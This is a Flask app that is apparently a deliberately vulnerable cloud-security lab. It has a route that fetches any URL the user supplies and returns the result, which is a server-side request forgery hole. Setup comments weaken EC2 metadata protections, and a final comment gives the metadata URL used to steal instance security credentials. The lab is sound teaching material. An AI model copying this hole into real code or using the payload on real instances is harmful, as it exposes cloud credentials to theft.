from flask import Flask, render_template, request
import requests
app = Flask(__name__)

@app.route("/")
def home():
    return render_template('home.html')


@app.route('/Services/pdf')    
def page():
    return render_template('pdf.html')
   

@app.route('/Services/pdf/Url')    
def services():
    url = request.args["url"]
    response = requests.get(url)
    response.raise_for_status()
    return response.content




# while making ec2 make sure instance metadata is available and imdv2 is optional
# securitygroup all trafic allowing instance
# sudo yum install -y git
# git clone https://github.com/Zero0x00/seasides-cloud-ec2-lab.git
# cd seasides-cloud-ec2-lab/
# python3 -m venv lab-venv 
# source lab-venv/bin/activate
# pip3 install -r requirment.txt
# curl http://169.254.169.254/latest/meta-data/local-ipv4| grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > p-ip
# python3 -m flask run --host=0.0.0.0 --port=8001
# nohup python3 -m flask run --host=0.0.0.0 --port=8001 &
# ps aux | grep "python3 -m flask run"
# kill <PID>


# url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"

